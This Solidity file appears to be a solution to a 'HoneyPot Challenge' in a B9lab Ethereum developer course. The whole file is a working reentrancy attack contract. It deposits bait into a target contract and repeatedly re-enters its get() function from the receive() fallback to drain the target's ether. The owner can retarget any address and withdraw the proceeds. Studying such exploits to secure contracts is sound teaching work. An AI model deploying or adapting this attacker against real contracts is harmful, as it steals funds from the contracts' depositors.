// SPDX-License-Identifier: Unlicense

//B9lab ETH-SUB Ethereum Developer Subscription Course
//>>> HoneyPot Challenge <<<
//
//Last update: 20.12.2020

pragma solidity 0.6.12;

import "./Owned.sol";

interface HoneyPotI{
    function put() payable external;
    function get() external;
}

contract Attacker is Owned{
    address public victimAddress;
    uint private bait;
    uint private attackRound;
    uint private attackHaul;
    uint private remainingGas;
    uint private roundGasDifference;

    event LogVictimAddressChanged(address indexed sender, address indexed newVictimAddress, address indexed oldVictimAddress);
    event LogAttack(address indexed sender, uint attackRound, uint remainingGas, uint roundGasDifference);
    event LogFallbackFunction(address indexed sender, uint attackRound, uint value, uint attackerBalance, uint victimBalance);
    event LogAttackHaul(uint attackHaul);
    event LogHaulWithdrawn(address indexed sender, uint amount);

    constructor(address _victimAddress) public payable{
        require(_victimAddress != address(0x0));

        victimAddress = _victimAddress;
        emit LogVictimAddressChanged(msg.sender, _victimAddress, address(0x0));
    }

    function startAttack() public payable returns(bool success){
        HoneyPotI(victimAddress).put{value: msg.value}();

        bait = msg.value;
        attackRound = 0;
        attackHaul = 0;
        remainingGas = gasleft();
        roundGasDifference = 0;

        emit LogAttack(msg.sender, attackRound, remainingGas, roundGasDifference);
        HoneyPotI(victimAddress).get();

        attackHaul = attackHaul-bait;
        emit LogAttackHaul(attackHaul);
        return true;
    }

    function proceedAttack() internal returns(bool success){
        roundGasDifference = remainingGas - gasleft();
        remainingGas = gasleft();

        if(victimAddress.balance >= bait && remainingGas > roundGasDifference){
            attackRound++;
            emit LogAttack(msg.sender, attackRound, remainingGas, roundGasDifference);
            HoneyPotI(victimAddress).get();
        }

        return true;
    }

    receive() external payable{
        attackHaul = attackHaul + msg.value;
        emit LogFallbackFunction(msg.sender, attackRound, msg.value, address(this).balance, victimAddress.balance);
        proceedAttack();
    }

    function setVictim(address _victimAddress) public onlyOwner returns(bool success){
        require(_victimAddress != address(0x0));

        victimAddress = _victimAddress;

        emit LogVictimAddressChanged(msg.sender, _victimAddress, address(0x0));
        return true;
    }

    function getBalanceAttacker() public view returns(uint attackerBalance){
        return address(this).balance;
    }

    function getBalanceVictim() public view returns(uint victimBalance){
        return victimAddress.balance;
    }

    function withdraw() public onlyOwner returns(bool success){
        require(address(this).balance > 0);

        uint amount = address(this).balance;

        LogHaulWithdrawn(msg.sender, amount);

        //EIP 1884 (https://eips.ethereum.org/EIPS/eip-1884) within Istanbul hard fork
        //Avoidance of Solidity's transfer() or send() methods
        (success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}